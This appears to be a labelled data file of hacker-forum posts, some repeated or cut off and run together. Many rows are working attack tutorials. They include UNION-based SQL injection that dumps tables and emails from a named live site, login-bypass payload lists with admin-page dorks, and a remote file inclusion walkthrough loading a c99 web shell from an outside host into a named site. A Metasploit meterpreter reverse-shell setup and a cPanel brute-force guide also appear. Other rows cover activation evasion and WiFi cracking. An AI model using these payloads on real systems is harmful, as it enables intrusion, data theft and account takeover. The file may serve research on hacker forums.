personal information. Both these events were significant enough for Sony to adopt two-factor authentication in its service a long time ago.",D2CrackingFire,NO

"Designer Drugs Directory This book is intended to serve as quick reference handbook on so-called designer drugs. These new, mainly synthetic compounds are also often referred to as analogues of controlled substances. This new work provides a unique directory of 104 designer drugs. This class of drugs is rapidly growing in variety and number of compounds. Although identification, toxicology and other properties have been thoroughly investigated, their analogues and derivatives remain poorly documented. This book fills the gap. Data which is available is often contradictory and confused. This directory provides a critical treatment of the subject which is thoroughly indexed including both the subject index and an index listing more that 230 street names of the described designer drugs. Divided into two parts; the first section describes aspects of designer drug manufacture, new abuse trends, sources of information and terminology. The second, descriptive part, classifies the drugs into ten main categories according to their chemical structure and prevalent pharmacological action. A separate chapter is devoted to each category, followed by a set of corresponding data sheets, street names and eventual synonyms, Toxicological data, short notes on the history of drugs as well as the most pertinent bibliographic references are included.  <br>",D3DreamMarket,NO

"INTRODUCTION ============ This is a very simple wrapper for exploiting SQL injection vulnerabilities using Metasploit. When command execution via xp_cmdshell or MS09004 exploitation is achieved, this wrapper allows the use of all the magic that brings Metasploit: vnc payloads, meterpreter, encoding payloads, etc. I ported two of the exploits which already come with the Metasploit framework. - mssql_payload_sqli can be used to exploit a xp_cmdshell vulnerability. Very simple - just indicate where the SQL injection is, and Metasploit will do the rest. GET/POST are supported. - mssql_sp_replwritetovarbin_sqli exploits MS09-004 using a sql injection vulnerability (sweet!). Obviously, no username or password needed. Beware that the SQL server dies after exploitation, so you will need to restart. INSTALLATION ============ To install this, just copy the library mssql_sqli.rb into the following folder: /opt/metasploit3/msf3/lib/msf/core/exploit/ Modify the /opt/metasploit3/msf3/lib/msf/core/exploit/mixins.rb file and include the following text: require 'msf/core/exploit/mssql_sqli' Copy the ms09_004_sp_replwritetovarbin_sqli.rb and mssql_payload_sqli.rb files into: ~/.msf3/modules/exploits/windows/mssql/ EXPLOITATION ============ Exploitation is very simple. For example: Given the following injection: http://172.16.207.128/showproduct.asp?id=1;select 'test';-- Exploitation would look like: use windows/mssql/ms09_004_sp_replwritetovarbin_sqli set RHOST 172.16.207.128 set GET_PATH /showproduct.asp?id=1;[SQLi];-- set PAYLOAD windows/meterpreter/reverse_tcp set LPORT 80 # Or 53 or 443 or whatever is allowed exploit The script will just replace [SQLi] with the payload. Obviously, you will need to execute metasploit as root if you want to set the listener on a low port. POST-EXPLOTATION ================ Exploiting MS09004 can potentially shut down the SQL server. The following is a reliable way of restaring it from a meterpreter payload: 1.- ""ps"" and check an available process on the remote host 2.- ""migrate"" to a chosen process 3.- kill sqlserver 4.- from a shell -- net start MSSQLSERVER Hidden Content: **Hidden Content: You must click 'Like' before you can see the hidden data contained here.**",D2CrackingFire,YES

We can send images as attachments to any user. By creating malicious image file and attaching it to mail attacker can exploit this vulnerability which can lead to complete compromise of account by stealing mail receiver cookies.  Gmail was not validating contents of uploaded image files which can lead to XSS by including java scripts in image files. Following are screen shots which demonstrates complete attack vector.           basically firstly this attack was limited for IE 6/7 but after some research i was able to bypass the IE8/9/10 protection which we presented in NullCon 2012. detail paper for same will be published soon here on g4h.",D4Garage4hackers,YES

"  Sounds bit different, but yes, hackers can blow your Apple laptop using its battery. According to security researcher Charlie Miller of Accuvant, AppleÂs Macbook batteries can be hacked to cause fires or used to plant malware. He will be demonstaring the hack at the Black Hat security conference which is going to be held next month in Las Vegas. The demonstration will be showing how to hack into and control a batteryÂs microprocessor  Charlie Miller told Forbes News that ÂThese batteries just arenÂt designed with the idea that people will mess with them. What IÂm showing is that itÂs possible to use them to do something really bad.Â If the controller for the battery has been compromised it can be manipulated to the point where the battery is dead i.e. bricked. It might be possible to cause a fire or explosion by placing malware on the chip, although Miller hasnÂt put up these idea so far. Well, the demonstration next month will be interesting to watch. This research has shown the potential of hacking in any form. It will be interesting to see whether other batteries and laptops resemble the same vulnerability.  Source",D4Garage4hackers,YES

"  We will start with the JS Deobfuscation.  I will at first pick the second malicious JS sent to us in the response. However, I will not mention the details and instead put the link to my paper on exploit-db which discusses about this JS.  Open the PDF from here: http://www.exploit-db.com/wp-content...docs/18746.pdf  Go to Page 12 and start following from there.  I have discussed the various tricks and techniques used by the obfuscator. It also presents a manual approach to deobfuscate the code efficiently.  To summarize it, you need to extract the decoding logic from the obfuscated JS and create a new HTML page. Put the obfuscated chunk of JS in it followed by the decoding logic and let it tell you the result.  There were 2 layers of obfuscation and the resulting HTML page was exploiting the CVE-2010-1885  I have put almost all the details there to deobfuscate it so I am not covering them once again here.  We will look at the first malicious JS sent in the HTTP Response and deobfuscate it.",D4Garage4hackers,YES

"Remote File Inclusion (RFI) is a type of vulnerability most often found on websites. It allows an attacker to include a remote file, usually through a script on the web server. The vulnerability occurs due to the use of user-supplied input without proper validation. This can lead to something as minimal as outputting the contents of the file, but depending on the severity, to list a few it can lead to: Code execution on the web server Code execution on the client-side such as JavaScript which can lead to other attacks such as cross site scripting (XSS). Denial of Service (DoS) Data Theft/Manipulation Lets Start 1st Step : Find a Vunerable websites using Google Dork some dork for searching a RFI Vuln website âinurl:index.php?page=â its Most Popular Dork of RFI hacking This will show all the pages which has âindex.php?page=â in their URL, Now to test whether the website is vulnerable to Remote file Inclusion or not the hacker use the following command www.targetsite.com/index.php?page=www.google.com see example of this website http://www.cbspk.com So the hacker url will become http://www.cbspk.com/v2/index.php?page=http://www.google.com If after executing the command the homepage of the google shows up then then the website is vulnerable to this attack if it does not come up then you should look for a new target. In my case after executing the above command in the address bar Google homepage shows up indicating that the website is vulnerable to this attack. Now the hacker would upload the shells to gain access. The most common shells used are c99 shell or r57 shell. I would use c99 shell. You can download c99 shell from the link below: http://www.sh3ll.org/c99.zip The hacker would first upload the shells to a webhosting site such as ripway.com, viralhosts.com,110mb.com or another free hosts etc. Now here is how a hacker would execute the shells to gain access. Lets say that the url of the shell is http://www.sh3ll.org/c99.txt? Now here is how a hacker would execute the following command to gain access http://www.cbspk.com/v2/index.php?page=http://www.sh3ll.org/c99.txt? Don't Forget To add â?â after .txt at the end of url or else the shell will not execute. Now the hacker is inside the website and he could do anything with it If You Like This Article or any other article on this Website or you have any problem related , then comment below",D2CrackingFire,YES

"Introduction: Hello every one . I am going to share with one of the best of my tutorials here . Now Let's begin!![lock] Sql injection (aka Sql Injection or Structured Query Language Injection) is the first step in the entry to exploiting or hacking websites. It is easily done and it is a great starting off point. Unfortunately most sqli tutorials suck, so that is why I am writing this one. Sqli is just basically injecting queries into a database or using queries to get authorization bypass as an admin. Things you should know : Data is in the columns and the columns are in tables and the tables are in the database . Just remember that so you understand the rest . [size=x-large]PART 1[/size] Bypassing admin log in Gaining auth bypass on an admin account. Most sites vulnerable to this are .asp First we need 2 find a site, start by opening google. Now we type our dork: ""defenition of dork"" 'a search entry for a certain type of site/exploit .ect"" There is a large number of google dork for basic sql injection. here is the best: Code: ""inurl:admin.asp"" ""inurl:login/admin.asp"" ""inurl:admin/login.asp"" ""inurl:adminlogin.asp"" ""inurl:adminhome.asp"" ""inurl:admin_login.asp"" ""inurl:administratorlogin.asp"" ""inurl:login/administrator.asp"" ""inurl:administrator_login.asp"" Now what to do once we get to our site. the site should look something like this : ADMIN USERNAME : PASSWORD : so what we do here is in the username we always type ""Admin"" and for our password we type our sql injection here is a list of sql injections Code: ' or '1'='1 ' or 'x'='x ' or 0=0 -- "" or 0=0 -- or 0=0 -- ' or 0=0 # "" or 0=0 # or 0=0 # ' or 'x'='x "" or ""x""=""x ') or ('x'='x ' or 1=1-- "" or 1=1-- or 1=1-- ' or a=a-- "" or ""a""=""a ') or ('a'='a "") or (""a""=""a hi"" or ""a""=""a hi"" or 1=1 -- hi' or 1=1 -- 'or'1=1' So your input should look like this username:Admin password:'or'1'='1 that will confuse the site and give you authorisation to enter as admin If the site is vulnerable than you are in [/lock]",D2CrackingFire,YES

"Hi today i am going to share you basic sql injection manually. Example site : http://www.mtiadventurewear.com/products.php?id=34 First we need to find the how many columns are there.For that.We run this commands. Code: http://www.mtiadventurewear.com/products.php?id=34 order by 1-- http://www.mtiadventurewear.com/products.php?id=34 order by 2-- http://www.mtiadventurewear.com/products.php?id=34 order by 3-- | | | | http://www.mtiadventurewear.com/products.php?id=34 order by 14-- (Until you get Unknown column '14' in 'order clause') So here we having 13 columns, 14th table we got error. Now we need to find the version of the mysql.. For that we need to to find the vul table first. Code: http://www.mtiadventurewear.com/products.php?id=-34 union select 1,2,3,4,5,6,7,8,9,10,11,12,13-- This will show you the vulnerable table numbers.here i got 3 and 4.Mostly i take the lowest table. Now we need to find the version number. Code: http://www.mtiadventurewear.com/products.php?id=-34 union select 1,2,@@version,4,5,6,7,8,9,10,11,12,13-- If we got version 5 it will be nice....Other wise we need to use error based sql injection. now we need to find the database name. Code: http://www.mtiadventurewear.com/products.php?id=-34 union select 1,2,group_concat(schema_name),4,5,6,7,8,9,10,11,12,13 from information_schema.schemata-- Now i got this . information_schema,h20b_mti h20b_mti is the database name..

So instead, convert the 'mti_contact' to Hex. To do that, I reccomend this site: http://www.swingnote.com/tools/texttohex.php Once you've converted your Table Name to Hex, you'll need to use the query again, but with Hex. So it should look like this: My selected not giving any error so i am not using it.If site got error to get colums names .U need to convert table name into hex.If u convert it then it looks like. Code: http://www.mtiadventurewear.com/products.php?id=-34 union select 1,2,group_concat(column_name),4,5,6,7,8,9,10,11,12,13 FROM information_schema.columns WHERE table_name=0xyourhexnumber Now i need data from email columns.

When you want to add some text dynamically to any element, following two ways I know works.  Example 1: Use of document.innerHTML   Code: Dynamic Text Addition example First line of paragraph.  add another text This code is vulnerable to XSS. document.innerHTML() doesn\'t sanitize the string. Replace ""Hey Hi dude!"" with """" and Test.  Example 2: Use of document.createTextNode()   Code: createTextNode example First line of paragraph.  add another textNode. Example taken from https://developer.mozilla.org/en/DOM...createTextNode  document.createTextNode() by default encode the malicious characters responsible for XSS. Replace "" Some text added dynamically. "" with """" and Test.  It is recommended to use document.createTextNode() instead of document.innerHTML to prevent XSS.  Hope you like this.

"  Hi Folks. You have probably heard that today is World IPv6 Day, with sites like Google, Facebook, and Yahoo publishing IPv6 records for their main web sites.  I\'m happy to report that the Nmap Project is celebrating in several ways:  ==Scanme Updated to IPv6== You probably know that we run the machine scanme.nmap.org as a system people are allowed to use as a target for test scans and the like. That system now has native IPv6 support. So if you have never performed an IPv6 port scan, you can do so with a command like:nmap -6 -v scanme.nmap.org  We also added a DNS record for scanmev6.nmap.org, which only has an IPv6 address (no IPv4). This can help for tools which might otherwise use Scanme\'s IPv4 address by default rather than IPv6. For example, you can insure that your web browser is connecting to the IPv6 version of the Scanme web site by visiting: http://scanmev6.nmap.org/ You might expect that to fail if you haven\'t done any IPv6 setup, but you might be surprised!

"Remote File Inclusion (RFI) is a type of vulnerability most often found on websites. It allows an attacker to include a remote file, usually through a script on the web server. The vulnerability occurs due to the use of user-supplied input without proper validation. This can lead to something as minimal as outputting the contents of the file, but depending on the severity, to list a few it can lead to: Code execution on the web server Code execution on the client-side such as JavaScript which can lead to other attacks such as cross site scripting (XSS).

"what's EngineX? It's an automatic search bot/leech bot that aims to leech combos (and websites too) and search for web pages containing them, but it also extracts the websites, giving the option to use a filter (theme). EngineX also has a very advanced filter/configuration system, the most powerful filter being the URL filter which allows you to use many functions to filter/fix URLs, for example removing ad sites like *******,zff.co and etc. Combo filters are specified in the main config file. One of the feature EngineX has to offer, is duplicate detection, not only does it efficiently remove duplicates during leech, but it also displays how many times a combo was detected as a duplicate, allowing you to see which combos are bad, or over-used (there's also an option for that on export/save). This tool aims to be for advanced users and to allow a lot of flexibility. You will also notice (if you have used any EZLeecher version) that the leeching is way more fast, and so is the filter processing. New features *Now supports two search engines (Google+Bing in default config) *Duplicate detection system *Supports theme/niche+appending of new URLs *Email only mode *Combo filters (length, remove, replace etc) *Complex URL filters *Debug mode *Redirection system+options to avoid redirection loops *Detailed logs *Detailed stats *Custom webpages/queries *Custom search patterns *Keywords collecting *Advanced output system And many more.

"Most of you might be aware of the fact that it is possible to use Windows 7 and Vista for 120 days without activation. This is actually possible using the slmgr -rearm command which will extend the grace period from 30 days to 120 days. However in this post I will show you a small trick using which it is possible to use Windows 7 without activation for approximately an year! Here is a way to do that. 1. Goto âStart Menu - All Programs - Accessoriesâ . Right click on âCommand Promptâ and select âRun as Administratorâ. If you are not the administrator then you are prompted to enter the password, or else you can proceed to step-2. 2. Now type the following command and hit enter slmgr -rearm 3. You will be prompted to restart the computer. Once restarted the trial period will be once again reset to 30 days. You can use the above command for up to 3 times by which you can extend the trial period to 120 days without activation. 4. Now comes the actual trick by which you can extend the trial period for another 240 days. Open Registry Editor (type regedit in âRunâ and hit Enter) and navigate to the following location HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform 5. In right-side pane, change value of SkipRearm to 1. 6. Now you will be able to use the slmgr -rearm command for another 8 times so that you can skip activation process for another 240 days. So you will get 120 + 240 = 360 days of free Windows 7 usage. 120 days using âslmgr -rearmâ command before registry edit if your trying this tutorial say thankx",D2CrackingFire,NO

"Introduction: Hello every one . I am going to share with one of the best of my tutorials here . Now Let's begin!![lock] Sql injection (aka Sql Injection or Structured Query Language Injection) is the first step in the entry to exploiting or hacking websites. It is easily done and it is a great starting off point. Unfortunately most sqli tutorials suck, so that is why I am writing this one. Sqli is just basically injecting queries into a database or using queries to get authorization bypass as an admin. Things you should know : Data is in the columns and the columns are in tables and the tables are in the database . Just remember that so you understand the rest . [size=x-large]PART 1[/size] Bypassing admin log in Gaining auth bypass on an admin account. Most sites vulnerable to this are .asp First we need 2 find a site, start by opening google. Now we type our dork: ""defenition of dork"" 'a search entry for a certain type of site/exploit .ect"" There is a large number of google dork for basic sql injection. here is the best: Code: ""inurl:admin.asp"" ""inurl:login/admin.asp"" ""inurl:admin/login.asp"" ""inurl:adminlogin.asp"" ""inurl:adminhome.asp"" ""inurl:admin_login.asp"" ""inurl:administratorlogin.asp"" ""inurl:login/administrator.asp"" ""inurl:administrator_login.asp"" Now what to do once we get to our site. the site should look something like this : ADMIN USERNAME : PASSWORD : so what we do here is in the username we always type ""Admin"" and for our password we type our sql injection here is a list of sql injections Code: ' or '1'='1 ' or 'x'='x ' or 0=0 -- "" or 0=0 -- or 0=0 -- ' or 0=0 # "" or 0=0 # or 0=0 # ' or 'x'='x "" or ""x""=""x ') or ('x'='x ' or 1=1-- "" or 1=1-- or 1=1-- ' or a=a-- "" or ""a""=""a ') or ('a'='a "") or (""a""=""a hi"" or ""a""=""a hi"" or 1=1 -- hi' or 1=1 -- 'or'1=1' So your input should look like this username:Admin password:'or'1'='1 that will confuse the site and give you authorisation to enter as admin If the site is vulnerable than you are in [/lock]",D2CrackingFire,YES

"  Pheww, so finally after messing badly with my friend\'s N900, I got gingerbread running. And after spending 3-4 nights w/ this phone, I must admit, I\'m in love with it.. <br>It took me 3-4 days because all the info is scattered here and there, and some things work, some don\'t. Finally after messing and flashing N900 5-7 times, I got what I was looking for.. <br> <br>Disclaimer : I\'m not responsible for any damage done to your phone or you. Use it at your own risk. <br> <br>If you wish to taste Android on N900 (I\'m sure there\'s very few of you), I\'d suggest you to try everything on a freshly installed N900.

"HACK Any WiFi Network  ULTIMATE WIFI HACKER Chances are you have a Wi-Fi network at home, or live close to one (or more) that tantalizingly pop up in a list whenever you boot up the laptop.<br><br>The problem is, if there's a lock next to the network name (the SSID, or service set identifier), that indicates security is turned on. Without the password or passphrase, you're not going to get access to that network, or the sweet, sweet internet that goes with it. <br><br>Well with this software you will be able to access ANY WiFi network you want!<br><br>============================================================================<br><br>1. Aircrack <br>Aircrack is one of the most popular wireless passwords cracking tools which you can use for 802.11a/b/g WEP and WPA cracking. Aircrack uses the best algorithms to recover wireless passwords by capturing packets. Once enough packets have been gathered, it tries to recover the password. To make the attack faster, it implements a standard FMS attack with some optimizations. <br>The company behind the tool also offers an online tutorial where you can learn how to install and use this tool to crack wireless passwords. It comes as Linux distribution, Live CD and VMware image options. You can use any of these. It supports most of the wireless adapters and is almost guaranteed to work. If you are using a Linux distribution, the only drawback of the tool is that it requires deeper knowledge of Linux. If you are not comfortable with Linux, you will find it hard to use this tool. In this case, try Live CD or VMWare image. VMWare Image needs less knowledge, but it only works with a limited set of host OS, and only USB devices are supported. <br>Before you start using this too, confirm that the wireless card can inject packets. Then start WEP cracking. Read the online tutorial on the website to know more about the tool. If you will follow steps properly, you will end up getting success with this tool. <br><br>2. AirSnort <br>AirSnort is another popular tool for decrypting WEP encryption on a wi-fi 802.11b network. It is a free tool and comes with Linux and Windows platforms. This tool is no longer maintained, but it is still available to download from Sourceforge. AirSnort works by passively monitoring transmissions and computing encryption keys once it has enough packets received. This tool is simple to use. If you are interested, you can try this tool to crack WEP passwords. <br><br>3. Cain & Able <br>Cain & Able is a popular password cracking tool. This tool is developed to intercept network traffic and then discover passwords by bruteforcing the password using cryptanalysis attack methods. It can also recover wireless network keys by analyzing routing protocols. It you are trying to learn wireless security and password cracking, you should once try this tool. <br><br>4.

"Introduction: Hello every one . I am going to share with one of the best of my tutorials here . Now Let's begin!![lock] Sql injection (aka Sql Injection or Structured Query Language Injection) is the first step in the entry to exploiting or hacking websites. It is easily done and it is a great starting off point. Unfortunately most sqli tutorials suck, so that is why I am writing this one. Sqli is just basically injecting queries into a database or using queries to get authorization bypass as an admin. Things you should know : Data is in the columns and the columns are in tables and the tables are in the database . Just remember that so you understand the rest . [size=x-large]PART 1[/size] Bypassing admin log in Gaining auth bypass on an admin account. Most sites vulnerable to this are .asp First we need 2 find a site, start by opening google. Now we type our dork: ""defenition of dork"" 'a search entry for a certain type of site/exploit .ect"" There is a large number of google dork for basic sql injection. here is the best: Code: ""inurl:admin.asp"" ""inurl:login/admin.asp"" ""inurl:admin/login.asp"" ""inurl:adminlogin.asp"" ""inurl:adminhome.asp"" ""inurl:admin_login.asp"" ""inurl:administratorlogin.asp"" ""inurl:login/administrator.asp"" ""inurl:administrator_login.asp"" Now what to do once we get to our site. the site should look something like this : ADMIN USERNAME : PASSWORD : so what we do here is in the username we always type ""Admin"" and for our password we type our sql injection here is a list of sql injections Code: ' or '1'='1 ' or 'x'='x ' or 0=0 -- "" or 0=0 -- or 0=0 -- ' or 0=0 # "" or 0=0 # or 0=0 # ' or 'x'='x "" or ""x""=""x ') or ('x'='x ' or 1=1-- "" or 1=1-- or 1=1-- ' or a=a-- "" or ""a""=""a ') or ('a'='a "") or (""a""=""a hi"" or ""a""=""a hi"" or 1=1 -- hi' or 1=1 -- 'or'1=1' So your input should look like this username:Admin password:'or'1'='1 that will confuse the site and give you authorisation to enter as admin If the site is vulnerable than you are in [/lock]",D2CrackingFire,YES

"  This tool is a demo to show Poc to developers. <br> <br>http://yehg.net/lab/pr0js/pentest/referer-xss/ <br> <br> <br>How it works <br> <br>You can give an example scene to developers like: <br> <br> Attacker give a user to his web site (Query contains XSS payload which doesn\'t execute on attacker site) User clicks a link, which causes a window open (hidden mode/iframe) to vulnerable application that\'s he\'s logged in Vuln app takes HTTP_Referer field and echoes it into HTML Body without escaping. Thus user credential (""cookie"") can stolen or other nasty things such as modifying user settings can be done <br> <br> <br>Note: <br> <br>In the past, referrer field spoofing could be done via Flash.

"In Brief Facebook has hit another Milestone: More than 1 MILLION people, or you can say privacy conscious, are accessing Facebook over TOR.Facebook proudly announced today that, this month, for the first time, the people connected to the anonymous version of Facebook that's accessible only through the TOR anonymity network exceeded 1 Million â an increase of almost 100% in the past ten months. Today, when global surveillance system continues to grow, encryption has the power to protect usersâ security and privacy online. And it is ultimately a good thing that companies like Facebook are competing on usersâ security.In 2014, Facebook launched a special version of its website that runs only with the help of Tor anonymity software that offers privacy to users. Tor anonymity software or Tor browser secures and encrypts connections to prevent cyber criminals or law enforcement agencies from tracking usersâ web activity. Tor users can visit Facebook's Tor hidden service via a special .Onion address: https://facebookcorewwwi.onion/ ""In June 2015, over a typical 30 day period, about 525,000 people would access Facebook over Tor,"" says Alec Muffett, Software Engineer at Facebook.â""This number has grown â roughly linearly â and this month, for the first time, we saw this â30 daysâ figure exceed 1 million people.""âMoreover, in January this year, Facebook added built-in Tor support for its Android app, allowing hundreds of millions of mobile users to maintain their online privacy when visiting Facebook. âThis growth is a reflection of the choices that people make to use Facebook over Tor, and the value that it provides them. We hope they will continue to provide feedback and help us keep improving.â Alec says.âBeyond Tor software and Facebook hidden service, you are also advised to adopt secure email services and privacy-enhanced mobile apps to protect yourself online, if you are privacy conscious.Recently, Whatsapp and Viber, two popular mobile messaging services also joined the encryption party by turning ON end-to-end encryption by default for their over Billion of users.",D2CrackingFire,NO

"built this software to check proxies against Google. The process is simple : the software will take one proxy, try to launch a query on Google.com and finally check if results are shown or not. If results are shown, so the proxy will be identified as Valid. If results are not shown but the Google captcha page, proxy will be identified as IP Blocked (Captcha). If no results, no captcha or timeout, the proxy will be identified as Invalid. The process is simple and accurate. Results can be really differents from ScrapeBox proxy checker, I don't know why and I don't know how the ScrapeBox proxy checker works exactly. Features : Fast & multithreaded Detect blocked proxies (captcha) Anti-crash (auto-save during checking) Light & portable application (700Kb) Max threads : 500 Max timeout : 90 sec Free for BHW !

"  In computer security, heap spraying is a technique used in exploits to facilitate arbitrary code execution.The term is also used to describe the part of the source code of an exploit that implements this technique. In general, code that sprays the heap attempts to put a certain sequence of bytes at a predetermined location in the memory of a target process by having it allocate (large) blocks on the process\' heap and fill the bytes in these blocks with the right values. They commonly take advantage from the fact that these heap blocks will roughly be in the same location every time the heap spray is run. Execution flow can be redirected to the heap sprays via buffer overflow or heap overflow flaws.  Heap spray was widely used by chinese hackers while attacking google and various embassies of different countries. Earlier ""vinnu"" bro had explained about heap spray. Long time ago, I got a good tutorial from the internet over heap spray. So I thought of sharing it with all people. It will give beginners a very good approach towards heap spray and its implementation. The tutorial is bit long, so no chance of posting it here. I m just gonna share the link of the blog. Its a blog of an info-sec guy. A good one So enjoy guys. Feedbacks and comments are appreciated  http://grey-corner.blogspot.com/2010...-internet.html",D4Garage4hackers,YES
  I am sure all of us would have encountered clients leaving out shell/batch/perl scripts with username/password combinations in Clear text. <br> <br>Take an example of a shell script which runs every night without user intervention to transfer some files from the system to a FTP server and the FTP credentials are hardcoded in the script. <br> <br>I just want to understand what is the best practice and optimal solution to tackle clear text passwords in scripts.I know of few solutions which I came across through discussions and googling....but would love to know your experiences in such scenarios. <br> <br>Cheers <br>AnArKi,D4Garage4hackers,NO

"built this software to check proxies against Google. The process is simple : the software will take one proxy, try to launch a query on Google.com and finally check if results are shown or not. If results are shown, so the proxy will be identified as Valid. If results are not shown but the Google captcha page, proxy will be identified as IP Blocked (Captcha). If no results, no captcha or timeout, the proxy will be identified as Invalid. The process is simple and accurate. Results can be really differents from ScrapeBox proxy checker, I don't know why and I don't know how the ScrapeBox proxy checker works exactly. Features : Fast & multithreaded Detect blocked proxies (captcha) Anti-crash (auto-save during checking) Light & portable application (700Kb) Max threads : 500 Max timeout : 90 sec Free for BHW !

"Respected members, Recently I came across a situation where I found an issue but I cannot exploit it. I am in dilemma whether I should report it or not. The issue is XEE: XML Entity Expansion. XML entities have been expanding as part of an error message. Content of error message is truncated after 4 entities. So I can expand up to only 4 entities. Now my questions are: 1) Is this really a qualified XEE case? 2) Would you report it or not? If you decide to report, would you name it as ""Potential XEE"" or just ""XEE""? 3) How should we report in cases of asynchronous vulnerabilities like Blind Second Order SQL Injection, Blind XSS etc?

"Technitium Mac Changer Technitium MAC Address Changer allows you to change (spoof) Media Access Control (MAC) Address of your Network Interface Card (NIC) instantly. It has a very simple user interface and provides ample information regarding each NIC in the machine. Every NIC has a MAC address hard coded in its circuit by the manufacturer. This hard coded MAC address is used by windows drivers to access Ethernet Network (LAN). This tool can set a new MAC address to your NIC, bypassing the original hard coded MAC address. Technitium MAC Address Changer is a must tool in every security professionals tool box.<br><br><br>Features<br>Works on Windows 7 & 8 for both 32-bit and 64-bit.<br>Enhanced network configuration presets with IPv6 support allow you to quickly switch between network configurations.<br>Allows complete configuration of any network adapter.<br>Command line options with entire software functionality available. You can select a preset from specified preset file to apply directly.<br>Update network card vendors list feature allows you to download latest vendor data (OUI) from IEEE.org.<br><br><br>How Does It Work?<br><br>This software just writes a value into the windows registry. When the Network Adapter Device is enabled, windows searches for the registry value 'NetworkAddress' in the key HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1- 08002bE10318}\[ID of NIC e.g. 0001]. If a value is present, windows will use it as MAC address, if not, windows will use the hard coded manufacturer provided MAC address. Some Network Adapter drivers have this facility built-in. It can be found in the Advance settings tab in the Network Adapter's Device properties in Windows Device Manager.<br><br><br>How To Change MAC Address<br>1.Starting MAC address changer will list all available network adapters.<br>2.Select the adapter you want to change the MAC address. You will get the details of your selection below.<br>3.In the Information tab, find the Change MAC Address frame. Enter new MAC address in the field and click Change Now! button. You may even click Random MAC Address button to fill up a randomly selected MAC address from the vendor list available.<br>4.To restore the original MAC address of the network adapter, select the adapter, click Restore Original button in the Change MAC Address frame. <br>",D3DreamMarket,YES

Need a SQL Injection Vulnerable site list now,D1CrackingArena,YES
"Hi today i am going to share you basic sql injection manually. Example site : http://www.mtiadventurewear.com/products.php?id=34 First we need to find the how many columns are there.For that.We run this commands. Code: http://www.mtiadventurewear.com/products.php?id=34 order by 1-- http://www.mtiadventurewear.com/products.php?id=34 order by 2-- http://www.mtiadventurewear.com/products.php?id=34 order by 3-- | | | | http://www.mtiadventurewear.com/products.php?id=34 order by 14-- (Until you get Unknown column '14' in 'order clause') So here we having 13 columns, 14th table we got error. Now we need to find the version of the mysql.. For that we need to to find the vul table first. Code: http://www.mtiadventurewear.com/products.php?id=-34 union select 1,2,3,4,5,6,7,8,9,10,11,12,13-- This will show you the vulnerable table numbers.here i got 3 and 4.Mostly i take the lowest table. Now we need to find the version number. Code: http://www.mtiadventurewear.com/products.php?id=-34 union select 1,2,@@version,4,5,6,7,8,9,10,11,12,13-- If we got version 5 it will be nice....Other wise we need to use error based sql injection. now we need to find the database name. Code: http://www.mtiadventurewear.com/products.php?id=-34 union select 1,2,group_concat(schema_name),4,5,6,7,8,9,10,11,12,13 from information_schema.schemata-- Now i got this . information_schema,h20b_mti h20b_mti is the database name.. Now we need to find the table names.here you go Code: http://www.mtiadventurewear.com/products.php?id=-34 union select 1,2,group_concat(table_name),4,5,6,7,8,9,10,11,12,13 from information_schema.tables where table_schema=database()-- Now we need to find the columns of a table.i am choosing mti_contact to get emails column. Code: http://www.mtiadventurewear.com/products.php?id=-34 union select 1,2,group_concat(column_name),4,5,6,7,8,9,10,11,12,13 FROM information_schema.columns WHERE table_name=""mti_contact"" For that query, you will almost ALWAYS get an error. So instead, convert the 'mti_contact' to Hex. To do that, I reccomend this site: http://www.swingnote.com/tools/texttohex.php Once you've converted your Table Name to Hex, you'll need to use the query again, but with Hex. So it should look like this: My selected not giving any error so i am not using it.If site got error to get colums names .U need to convert table name into hex.If u convert it then it looks like. Code: http://www.mtiadventurewear.com/products.php?id=-34 union select 1,2,group_concat(column_name),4,5,6,7,8,9,10,11,12,13 FROM information_schema.columns WHERE table_name=0xyourhexnumber Now i need data from email columns. Code: http://www.mtiadventurewear.com/products.php?id=-34 union select 1,2,group_concat(email),4,5,6,7,8,9,10,11,12,13 FROM mti_contact-- If you want to gte them in an order then use this Code: http://www.mtiadventurewear.com/products.php?id=-34 union select 1,2,group_concat(email,0x0a),4,5,6,7,8,9,10,11,12,13 FROM mti_contact-- 0x0a this will create the new line per email i will add the video soon.",D2CrackingFire,YES

"  Hi Darwinblaine,  Since there are lots of things, I will try to cover a whatever I can think of right now. Here are some of the things that you can do to secure you SSH:   Disable root login on your server -      To disable root SSH login, edit /etc/ssh/sshd_config with your favorite text editor.  [root@root ~]# vi /etc/ssh/sshd_config Change this line:  #PermitRootLogin yes Edit to this:  PermitRootLogin no   Source: https://mediatemple.net/community/pr...-the-root-user  Disable password based login and switch to using on key based auth. There are various sources available on internet. Something like this would work - https:../www.digitalocean.com/communi...a-linux-server.  If you know that your client IP is going to stay static, you can allow access to only specific IPs using IPtables. Something like this - https://unix.stackexchange.com/quest...her-connection  It is recommended that you install fail2ban on server to stop bruteforce attack. Guide like this should work - https:../www.digitalocean.com/communi...n-ubuntu-14-04.  You can deploy port knocking to hide your SSH daemon. How to do this here - https:../www.digitalocean.com/communi...kers-on-ubuntu.  You can also follow instructions from this guide - https:../www.cyberciti.biz/tips/linux...practices.html.   It would also help if all of the services on your server are configured properly, patched and on latest version. Also make your server is patched, as to not allow local privesc. I would suggest you only run the services that you need.  These are some of the things that I could think of. I am sure others can contribute much more.   Cheers, c0dist.",D4Garage4hackers,NO

Today i will teach you how to crack Cpanel.The tutorial is really easy so i will mostly talk some useless text in here to make the thread a bit longer.The thread will be short and wont take alot time.I personally don't like cracking at all.One reason is that it takes alot of time and second reason is that in cracking you don't have to do anything and think alot instead of hacking.That's another tutorial where you run a tool and it will do the work for you.â For those who doesn't know, Cpanel looks like this. Now let's start with the tutorial 1)Download the tool : *** hidden content *** Virustotal scan: https://www.virustotal.com/file/e085fd91...344111661/ 2)Open up the tool and on the Hosts tab write the websites name what you want to crack. 3)choose the port. 4)Write the administrator name to the ""user"" tab. 5)Upload some wordlist.txt or leave it and use default one Smiling 6)Press the ""Start"" button.

